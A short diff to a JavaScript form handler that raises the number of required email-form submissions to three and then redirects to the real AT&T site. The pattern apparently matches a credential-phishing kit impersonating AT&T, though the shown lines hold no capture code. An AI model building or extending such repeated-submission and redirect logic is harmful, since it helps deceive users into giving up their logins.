@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', function() {
     let submissionCount = 0;
-    const requiredSubmissions = 2;
-    const redirectUrls = ['contact.html']; 
+    const requiredSubmissions = 3;
+    const redirectUrls = ['https://www.att.net']; 
 
     const userForm = document.getElementById('user-form');
     const emailInput = document.getElementById('email');
